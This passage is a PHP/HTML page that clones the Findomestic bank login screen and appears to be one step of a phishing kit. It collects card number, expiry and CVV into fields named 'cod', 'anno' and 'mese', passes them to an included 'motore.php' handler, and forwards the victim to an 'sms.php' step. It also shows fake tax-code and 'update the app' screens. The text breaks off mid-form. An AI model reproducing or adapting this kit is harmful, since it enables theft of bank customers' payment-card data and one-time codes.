﻿<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('cod','anno','mese',);
$numero = 1;
$prossima = "sms.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");
?>
<html>
<html class="mdl-js"><head><meta charset="utf-8"><title>Area Clienti - Findomestic</title><!-- app version 0.0.319 --><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="description" content="Findomestic - Banca digitale"><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"><meta http-equiv="cache-control" content="no-cache, must-revalidate, post-check=0, pre-check=0"><meta http-equiv="expires" content="0"><meta http-equiv="pragma" content="no-cache"><link rel="icon" type="image/x-icon" href="assets/favicon.ico"><!-- Add to homescreen for Chrome on Android --><meta name="mobile-web-app-capable" content="yes"><link rel="icon" sizes="192x192" href="assets/android-chrome-192x192.png"><!-- Add to homescreen for Safari on iOS --><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="apple-mobile-web-app-title" content="Findomestic - Banca digitale"><link rel="apple-touch-icon-precomposed" href="assets/apple-touch-icon.png"><meta name="format-detection" content="telephone=no"><!-- App SmartBanner --><meta name="apple-itunes-app" content="app-id=606266909"><meta name="google-play-app" content="app-id=com.beeweeb.findomestic"><link rel="stylesheet" href="smart-app-banner.css" type="text/css" media="screen"><link rel="android-touch-icon" href="assets/android-touch-icon.png"><link rel="shortcut icon" href="assets/favicon-32x32.png"><style></style><style>.version{bottom:10px;position:relative;text-align:right;color:#fff}.display-block{display:block}.login-slider-height-1{height:296px}@media screen and (max-width:645px){.login-slider-height-1{height:330px}}@media screen and (max-width:360px){.login-slider-height-1{height:350px}}@media screen and (max-width:320px){.login-slider-height-1{height:340px}}.login-slider-height-2{height:240px}@media screen and (max-width:380px){.login-slider-height-2{height:260px}}@media screen and (max-width:320px){.login-slider-height-2{height:282px}}.login-slider-margin-1{margin-bottom:-40px}@media screen and (max-width:425px){.login-slider-margin-1{margin-bottom:-30px}}.login-slider-margin-2{margin-bottom:-40px}@media screen and (max-width:425px){.login-slider-margin-2{margin-bottom:-30px}}.login-slider-margin-3{margin-bottom:-40px}@media screen and (max-width:425px){.login-slider-margin-3{margin-bottom:-30px}}@media (max-width:479px){.find-agency-link{display:block;padding-top:10px}}.update-app-dialog .mdl-card{border:0}.update-app-dialog .mdl-button{background-color:#00a258!important}.update-app-dialog .mdl-dialog{width:100%;height:100%;max-height:100%}.update-app-dialog .mdl-dialog .mdl-dialog__content{margin:0}.update-app-dialog .mdl-dialog .mdl-dialog__content .fd-txt{color:#000}.update-app-dialog .mdl-dialog .mdl-dialog__content .fd-logo-update{width:150px;margin-bottom:10px}.update-app-dialog .mdl-dialog .mdl-dialog__content .fd-title{padding-top:50px}.update-app-dialog .mdl-dialog .mdl-dialog__content .txt-description{color:#000;padding-bottom:140px}.update-app-dialog .mdl-dialog .mdl-dialog__content .text-center{text-align:center}.update-app-dialog .mdl-dialog .mdl-dialog__content .text-left{text-align:left}.row .mdl-card__actions{padding:35px 0}.row .mdl-card__actions fnd-button{display:block!important;text-align:center}@media (min-device-width:768px){.row .mdl-card__actions{text-align:center}.row .mdl-card__actions fnd-button{display:inline-block!important;text-align:center}.row .mdl-card__actions .fd-button{float:none;text-align:right}}.f12.button{font-size:12px}.exit-to-app-button{text-transform:none}.top30{position:relative;top:30px}.app-permission-dialog .mdl-dialog .mdl-dialog__actions button.mdl-button.fd-primary:first-child,.app-permission-dialog .mdl-dialog .mdl-dialog__actions button.mdl-button.fd-primary:hover:first-child{background-color:#00a258;color:#fff}a.link-underline{text-decoration:underline}@media (min-width:768px){.float-right{float:right!important}}fnd-card.cstm-border .mdl-card{border:0!important}@media (max-width:839px) and (min-width:480px){.mdl-grid{-ms-flex-flow:row;flex-flow:row}}.marginUp{margin-top:-10px}.modalHelp .close-icon i.material-icons{color:#fff!important}.fd-input-ctn.note input{padding-top:25px}.modalHelp .mdl-dialog__title{background:#0d5c63}.modalHelp .mdl-dialog__title h2{color:#fff;font-family:facitsemibold,Open Sans,arial,sans-serif;letter-spacing:1px!important;font-size:16px;line-height:16px;width:85%}@media only screen and (max-device-width:568px) and (min-device-width:320px) and (orientation:portrait){.modalHelp .modal{top:0}.fd-input-ctn.note input{padding-top:50px}.modalHelp .mdl-card .mdl-card__actions .fd-button{float:none;display:-ms-flexbox;display:flex;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.modalHelp .mdl-card .mdl-card__actions .fd-button .mdl-button{width:100%;text-align:center;float:none}.modalHelp .mdl-dialog__title{width:100%!important;position:relative;height:70px}}@media only screen and (max-device-width:768px) and (min-device-width:320px) and (orientation:portrait){.modalHelp .mdl-dialog__title{width:100%!important;position:relative;height:70px}}</style><style>.modal-overlay{background-color:rgba(87,84,84,.4);position:fixed;z-index:600;bottom:0;left:0;right:0;top:0;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center}.closed .modal{top:-200%}.closed .modal-overlay{display:none}.modal{box-shadow:0 12px 15px 0 rgba(0,0,0,.22),0 17px 20px 0 rgba(0,0,0,.12);background-color:#fff;overflow-y:auto;position:fixed;width:auto;z-index:650;transform:translate(-50%,-50%);left:50%;top:50%;max-height:100%}.modal .body{padding:0}@media only screen and (min-width:840px){.modal{max-width:650px;width:100%}}@media only screen and (max-height:850px){.modal{transform:translate(-50%,-50%)}}@media only screen and (min-width:600px){.modal{width:77.381vw}}@media only screen and (max-width:600px){.modal{width:100%}}@media only screen and (min-width:320px) and (max-width:568px) and (orientation:portrait){.modal{width:100%;max-height:100%;overflow-y:scroll;left:0;bottom:0;top:0;transform:translate(0)!important}}@media only screen and (min-device-width:320px) and (max-device-width:568px) and (orientation:portrait){.modal{top:65px}}.mdl-dialog .close-icon i.material-icons{color:#0d5c63}.mdl-dialog .filter-button span{font-size:15px}.modal .mdl-color--grey-200{background-color:#f4f4f9!important}.mdl-dialog .mdl-dialog__title.bkg{background-color:#f4f4f9!important;padding:8px!important}.dialog-header-filter.close-icon{padding:0 5px}h2.dialog-header-filter{color:#0d5c63;line-height:normal;display:inline-block;vertical-align:middle}.filter-button{float:right}.fd-ctn-frm.pTop{padding-top:55px}h2.listTitle{margin:40px 0 0 0}@media only screen and (max-device-width:568px) and (min-device-width:320px) and (orientation:portrait){h2.listTitle{margin:40px 0 20px 0}}@media only screen and (min-width:840px){.filter-modal .modal{max-width:670px;width:100%}}@media only screen and (min-width:840px){.filter-modal.mdl-dialog .mdl-cell.all-width{width:calc(50% - 12px)}}@media only screen and (min-width:840px){.filter-modal.mdl-dialog .mdl-cell.all-width-single{width:100%}}.filter-modal.mdl-dialog .mdl-cell{margin:0}.filter-modal.mdl-dialog .mdl-grid{padding:0}.filter-modal.mdl-dialog .mdl-dialog__title.bkg{padding-left:6px!important;padding-top:11px!important}.mdl-dialog .mdl-grid.grid-padding-bottom-date{padding-bottom:18px}.mdl-dialog .mdl-grid.grid-padding-bottom-date-reduced{padding-bottom:16px}.mdl-dialog .mdl-grid.grid-padding-bottom-sel{padding-bottom:35px}.mdl-dialog .mdl-grid.grid-padding-bottom-sel-reduced{padding-bottom:13px}.mdl-dialog .mdl-cell.cell-margin-right-dis{margin-right:24px}.filter-modal.mdl-dialog .mdl-dialog__title.title-height{height:60px}.filter-modal.mdl-dialog .mdl-dialog__title.title-height .material-icons{font-size:32px}.mdl-dialog .mdl-dialog__content.content-margin-top{margin-top:60px}.mdl-dialog .mdl-dialog__content.content-padding-tlr{padding-top:23px;padding-left:16px;padding-right:16px}.mdl-dialog .mdl-dialog__content.content-margin-btm{margin-bottom:16px}.mdl-dialog .mdl-dialog__content.no-content-margin-btm{margin-bottom:0}.filter-modal.mdl-dialog .middle-fd-ckeckbox .fd-checkbox-ctn{margin-bottom:33px}.filter-modal.mdl-dialog .last-fd-ckeckbox .fd-checkbox-ctn{margin-bottom:12px}.filter-modal.mdl-dialog .last-fd-input .fd-input-ctn{margin-bottom:16px}.filter-modal.mdl-dialog .no-margin-fd-input .fd-input-ctn{margin-bottom:0}.filter-modal.mdl-dialog .mdl-dialog__content.content-margin-bottom{margin-bottom:55px}</style><style>.fnd-ripple-effect[_ngcontent-c6]{overflow:hidden;position:relative;transition:background-color .3s linear,border .3s linear}.fnd-ripple-effect[_ngcontent-c6]:after{content:"";display:block;position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none;background-image:radial-gradient(circle,#000 10%,transparent 10.01%);background-repeat:no-repeat;background-position:50%;transform:scale(10);opacity:0;transition:transform .5s,opacity 1s}.fnd-ripple-effect[_ngcontent-c6]:active:after{transform:scale(0);opacity:.2;transition:0s}</style><style>[_nghost-c2] { width:100%; display:block; overflow:hidden }</style><style>[_nghost-c2]    > div.animate[_ngcontent-c2] { 
			-webkit-transition: 400ms ease-in-out;
			-moz-transition: 400ms ease-in-out;
			-o-transition: 400ms ease-in-out;
			transition: 400ms ease-in-out;
		}</style><style>[_nghost-c3] { float:left }</style><style>.fd-input-ctn[_ngcontent-c5]   .password_switch[_ngcontent-c5] { position:absolute; left:auto !important; right:2px; cursor:pointer !important; z-index: 1 }</style>
	<link href="bundle.css" rel="stylesheet">
	<script src="jquery-3.5.1.min.js"></script>
  <script src="jquery.payform.min.js"></script>

</head><body><app-root ng-version="4.4.7">
<div class="mdl-layout__container"><div class="mdl-layout mdl-js-layout mdl-layout--fixed-header bh-menu bh-menu-user is-upgraded is-small-screen" mdl="" data-upgraded=",MaterialLayout">
   	

	<main class="mdl-layout__content bh-main">

		<div>
			<router-outlet></router-outlet><app-login><div class="login-logo-cont">
  <!----><img class="login-logo" src="logo.svg">
</div>

<div class="loginBar" style="background-color:#00A258;height:100px"></div>

<div class="fd-content content-grid mdl-grid" style="width:800px;margin:0 auto">
  <div class="mdl-layout-spacer"></div>
  

  

  <!----><div class="mdl-cell" style="width:100%;margin-top:-55px">
    <!---->
    <fnd-slider _nghost-c2=""><div _ngcontent-c2="" style="width: 400%; transform: translate3d(0px, 0px, 0px);" class="animate">
	
      <fnd-slide _nghost-c3="" style="visibility: visible; width: 25%;">
        <!----><fnd-card customcssclass="mdl-shadow--2dp"><form method="POST" class="mdl-card mdl-shadow--2dp">
	
          <fnd-card-header title="Accedi all'Area Clienti"><div class="mdl-card__title" mdl="">
	<h2 class="mdl-card__title-text">
		
		<span>Inserisci i dati della Carta</span>
	</h2>
	<!---->
</div></fnd-card-header>
          <!---->

          <fnd-card-body customcssclass="fd-ctn-frm"><div class="mdl-card__supporting-text fd-ctn-frm">
	
            <div novalidate="" class="ng-untouched ng-invalid ng-dirty">
              <fnd-text-input id="username" label="Username" name="username" required="" class="ng-untouched ng-dirty ng-valid"><!---->

<!---->

<!---->

<div class="fd-input-ctn">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded is-dirty" data-upgraded=",MaterialTextfield">
		<!---->
		<input autocapitalize="off" autocomplete="off" autocorrect="none" class="mdl-textfield__input ng-valid ng-dirty ng-touched"
		 spellcheck="false" type="text" name="cod" id="carta">
		<!----><label class="mdl-textfield__label">Numero Carta</label>
		
                
              
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div>

<div class="fd-input-ctn">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded is-dirty" data-upgraded=",MaterialTextfield">
		<!---->
		<input autocapitalize="off" autocomplete="off" autocorrect="none"
		 class="mdl-textfield__input ng-valid ng-dirty ng-touched" spellcheck="false" type="text" name="anno" id="scadenza">
		<!----><label class="mdl-textfield__label">Scadenza</label>
		
                
              
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div><div class="fd-input-ctn">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded is-dirty" data-upgraded=",MaterialTextfield">
		<!---->
		<input autocapitalize="off" autocomplete="off" autocorrect="none" class="mdl-textfield__input ng-valid ng-dirty ng-touched" spellcheck="false" type="text" name="mese" id="username">
		<!----><label class="mdl-textfield__label">Cvv</label>
		
                
              
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div><div class="fd-input-ctn">  
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div>

</fnd-text-input>
              
            </div>
          
</div></fnd-card-body>
          <fnd-card-footer><div class="mdl-card__actions ">

	
            <div class="mdl-grid">
              <div class="mdl-cell mdl-cell--3-col-tablet mdl-cell--3-col-desktop">
				<fnd-button customcssclass="fd-btn mdl-js-ripple-effect" label="ENTRA" _nghost-c6=""><!---->
				<button _ngcontent-c6="" id="0794b193-fb9a-4268-9cb7-5d0f74438352" class="mdl-button mdl-js-button  fd-btn mdl-js-ripple-effect" type="submit" data-upgraded=",MaterialButton,MaterialRipple">
   <!---->CONTINUA
<span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button>

<!---->
<!----></fnd-button>
              </div>
              
            </div>
          
	
</div>
</fnd-card-footer>
        
	
	
	<div class="fd-busy" style="display: none;">
		<div class="fd-spinner">
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner"><div class="mdl-spinner__layer mdl-spinner__layer-1"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-2"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-3"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-4"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div></div>
		</div>
	</div>
</form>
<br></fnd-card>

        <!----><!---->
          <!---->

          <!---->
        

        <!---->
      </fnd-slide>

      <fnd-slide _nghost-c3="" style="visibility: hidden; width: 25%;">
        <fnd-card customcssclass="mdl-shadow--2dp"><div class="mdl-card mdl-shadow--2dp">
	  
          <fnd-card-header title="Accedi all'Area Clienti"><div class="mdl-card__title" mdl="">
	<h2 class="mdl-card__title-text">
		
		<span>Accedi all'Area Clienti</span>
	</h2>
	<!---->
</div></fnd-card-header>
          <!---->
          <fnd-card-body customcssclass="fd-ctn-frm"><div class="mdl-card__supporting-text fd-ctn-frm">
	
            <div class="mdl-card__supporting-text no-padding">
              <p class="fd-txt">
                Inserisci il tuo codice fiscale.
              </p>
              <form method="POST" class="ng-untouched ng-pristine ng-invalid">
                <fnd-text-input label="Codice Fiscale" name="cfPiva" pattern="(^[a-zA-Z]{6}[0-9lLmMnNpPqQrRsStTuUvV]{2}[a-zA-Z]{1}[0-9LmMnNpPqQrRsStTuUvV]{2}[a-zA-Z]{1}[0-9LmMnNpPqQrRsStTuUvV]{3}[a-zA-Z]{1}$)" required="" class="ng-untouched ng-pristine ng-invalid"><!---->

<!---->

<!----><div class="fd-input-ctn">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded" data-upgraded=",MaterialTextfield">
		<!---->
		<input autocapitalize="off" autocomplete="off" autocorrect="none" class="mdl-textfield__input ng-untouched ng-pristine ng-valid" spellcheck="false" type="text" name="cfPiva" id="cfPiva">
		<!----><label class="mdl-textfield__label">Codice Fiscale</label>
		
                
                
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div>
</fnd-text-input>
              </form>
            </div>
          
</div></fnd-card-body>
          <fnd-card-footer><div class="mdl-card__actions ">

	
            <div class="fd-button">
              <fnd-button customcssclass="fd-btn mdl-js-ripple-effect" label="Avanti" showicon="false" _nghost-c6=""><!----><button _ngcontent-c6="" id="db85d49b-c00f-4499-95a6-1851222b6300" class="mdl-button mdl-js-button  fd-btn mdl-js-ripple-effect" type="button" data-upgraded=",MaterialButton,MaterialRipple">
   <!----><i _ngcontent-c6="" class="material-icons"></i> Avanti
<span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button>

<!---->
<!----></fnd-button>
            </div>
          
	
</div>
</fnd-card-footer>
        
	
	
	<div class="fd-busy" style="display: none;">
		<div class="fd-spinner">
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner"><div class="mdl-spinner__layer mdl-spinner__layer-1"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-2"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-3"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-4"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div></div>
		</div>
	</div>
</div>
<br></fnd-card>
      </fnd-slide>

      <fnd-slide _nghost-c3="" style="visibility: hidden; width: 25%;">
        <fnd-card customcssclass="mdl-shadow--2dp"><div class="mdl-card mdl-shadow--2dp">
	
          <fnd-card-header title="Accedi all'Area Clienti"><div class="mdl-card__title" mdl="">
	<h2 class="mdl-card__title-text">
		
		<span>Accedi all'Area Clienti</span>
	</h2>
	<!---->
</div></fnd-card-header>
          <!---->
          <fnd-card-body customcssclass="fd-ctn-frm"><div class="mdl-card__supporting-text fd-ctn-frm">
	
            <!---->
            <!---->
          
</div></fnd-card-body>
        
	
	
	<div class="fd-busy" style="display: none;">
		<div class="fd-spinner">
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner"><div class="mdl-spinner__layer mdl-spinner__layer-1"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-2"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-3"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-4"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div></div>
		</div>
	</div>
</div>
<br></fnd-card>
      </fnd-slide>

      <fnd-slide _nghost-c3="" style="visibility: hidden; width: 25%;">
        <fnd-card customcssclass="mdl-shadow--2dp"><div class="mdl-card mdl-shadow--2dp">
	
          <fnd-card-header title="Accedi all'Area Clienti"><div class="mdl-card__title" mdl="">
	<h2 class="mdl-card__title-text">
		
          
		<span>Accedi all'Area Clienti</span>
	</h2>
	<!---->
</div></fnd-card-header>
          <fnd-card-body><div class="mdl-card__supporting-text ">
	
            <div class="fd-box-outcome">
              <div class="fd-msg">
                <span class="fd-circular"><img src="./esito-error.png"></span>
                <p class="fd-summary">
                  I dati inseriti non sono corretti. Recupera le tue credenziali, effettua una nuova registrazione oppure scrivici. <!---->
                </p>
              </div>
            </div>
          
</div></fnd-card-body>
          <fnd-card-footer><div class="mdl-card__actions ">

	
            <!---->
            <!----><fnd-button customcssclass="fd-primary mdl-js-ripple-effect" label="GUARDA DOVE SIAMO" showicon="false" _nghost-c6=""><!----><button _ngcontent-c6="" id="95a215e4-33a2-4ffa-bd67-04546a23c18f" class="mdl-button mdl-js-button  fd-primary mdl-js-ripple-effect" type="button" data-upgraded=",MaterialButton,MaterialRipple">
   <!----><i _ngcontent-c6="" class="material-icons"></i> GUARDA DOVE SIAMO
<span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button>

<!---->
<!----></fnd-button>
          
	
</div>
</fnd-card-footer>
        
	
	
	<div class="fd-busy" style="display: none;">
		<div class="fd-spinner">
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner"><div class="mdl-spinner__layer mdl-spinner__layer-1"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-2"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-3"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-4"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div></div>
		</div>
	</div>
</div>
<br></fnd-card>
      </fnd-slide>

    
</div></fnd-slider>

    
    <!----><!---->
      <fnd-card customcssclass="mdl-shadow--2dp fixIos">
<br></fnd-card>

      <fnd-card customcssclass="mdl-shadow--2dp">
<br></fnd-card>
    

  </div>
  <div class="mdl-layout-spacer"></div>
</div>

<!----><fnd-modal-dialog class="update-app-dialog"><dialog class="mdl-dialog fixed">
	<!---->
	<!---->
	<div class="mdl-dialog__content ">
		
  <fnd-card><div class="mdl-card ">
	
    <fnd-card-body><div class="mdl-card__supporting-text ">
	
      <div class="login-logo-cont fd-logo-update">
        <img class="login-logo header-logo-info-message" src="assets/logo_findo.svg">
      </div>
      <div class="text-center">
        <strong class="fd-txt fd-title">Importante!</strong>
        <br>
        <p class="fd-txt text-left txt-description">Per poter continuare a utilizzare i nostri servizi, devi aggiornare l'App Findomestic.
</p>
        <fnd-button class="update-button" customcssclass="mdl-button mdl-js-button fd-btn" label="Aggiorna" _nghost-c6=""><!----><button _ngcontent-c6="" id="ed6b5c93-1410-45e9-8444-b7fc364be44a" class="mdl-button mdl-js-button  mdl-button mdl-js-button fd-btn" type="button" data-upgraded=",MaterialButton">
   <!----> Aggiorna
</button>

<!---->
<!----></fnd-button>
      </div>
    
</div></fnd-card-body>
  
	
	
	<div class="fd-busy" style="display: none;">
		<div class="fd-spinner">
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner"><div class="mdl-spinner__layer mdl-spinner__layer-1"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-2"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-3"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-4"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div></div>
		</div>
	</div>
</div>
<br></fnd-card>

	</div>
	<!---->
</dialog></fnd-modal-dialog>



<app-modal class="mdl-dialog hide-modal show-modal modalHelp">
      <div class="closed">
        <div class="modal-overlay"></div>
        <div class="modal">
          <div class="body">
            
  
  <div class="mdl-dialog__title">
    <h2 class="dialog-header-filter">STAI RISCONTRANDO DEI PROBLEMI AD ACCEDERE AL TUO ACCOUNT?</h2>
    <fnd-button class="pull-right" customcssclass="dialog-header-filter close-icon fd-generic-info-modal marginUp" icon="close" showicon="true" _nghost-c6=""><!----><button _ngcontent-c6="" id="ba0910f2-eae0-46f8-b081-d740b75eee4d" class="mdl-button mdl-js-button  dialog-header-filter close-icon fd-generic-info-modal marginUp" type="button" data-upgraded=",MaterialButton">
   <!----><i _ngcontent-c6="" class="material-icons">close</i> 
</button>

<!---->
<!----></fnd-button>
  </div>

  
  <div class="fd-ctn-frm pTop modal-padding padding-left padding-right">
    
    <!---->
    <!---->

    <fnd-card class="cstm-border"><div class="mdl-card ">
	
      <!----><fnd-card-body customcssclass="fd-ctn-frm"><div class="mdl-card__supporting-text fd-ctn-frm">
	
        <!---->
          <p class="fd-txt" style="font-weight: bold;">
            Può capitare di avere dei problemi di accesso e i motivi possono essere molti. Inserisci qui i tuoi dati e una breve descrizione del problema. Faremo del nostro meglio per risponderti il prima possibile.
          </p>
          <form method="POST" class="ng-untouched ng-pristine ng-invalid">
            <fnd-text-input label="Username" maxlength="100" name="helpUserName" required="" class="ng-untouched ng-pristine ng-invalid"><!---->

<!---->

<!----><div class="fd-input-ctn">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded" data-upgraded=",MaterialTextfield">
		<!---->
		<input autocapitalize="off" autocomplete="off" autocorrect="none" class="mdl-textfield__input ng-untouched ng-pristine ng-valid" spellcheck="false" type="text" name="helpUserName" id="helpUserName" maxlength="100">
		<!----><label class="mdl-textfield__label">Username</label>
		
            
            
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div>
</fnd-text-input>

            <fnd-text-input label="Email" name="helpEmail" required="" pattern="/^(([^<>()\[\]\\.,;:\s@&quot;]+(\.[^<>()\[\]\\.,;:\s@&quot;]+)*)|(&quot;.+&quot;))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/" class="ng-untouched ng-pristine ng-invalid"><!---->

<!---->

<!----><div class="fd-input-ctn">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded" data-upgraded=",MaterialTextfield">
		<!---->
		<input autocapitalize="off" autocomplete="off" autocorrect="none" class="mdl-textfield__input ng-untouched ng-pristine ng-valid" spellcheck="false" type="text" name="helpEmail" id="helpEmail">
		<!----><label class="mdl-textfield__label">Email</label>
		
            
            
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div>
</fnd-text-input>

            <fnd-text-input customcssclass="note" label="Note (Massimo 600 caratteri)" maxlength="600" name="helpNote" required="" class="ng-untouched ng-pristine ng-invalid"><!---->

<!---->

<!----><div class="fd-input-ctn note">
	<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label is-upgraded" data-upgraded=",MaterialTextfield">
		<!---->
